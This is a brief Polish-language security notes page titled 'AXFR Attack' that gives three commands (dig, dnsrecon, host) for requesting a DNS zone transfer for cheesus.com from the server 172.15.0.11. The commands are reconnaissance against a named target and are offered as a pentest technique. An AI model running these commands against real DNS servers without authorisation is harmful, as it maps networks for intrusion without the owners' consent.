---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# AXFR Attack - kopiowanie serwera adresów DNS

```python
dig cheesus.com @ 172.15.0.11 AXFR
```

```python
dnsrecon -d cheesus.com -t axfr -n 172.15.0.11
```

```python
host -t axfr cheesus.com 172.15.0.11
```
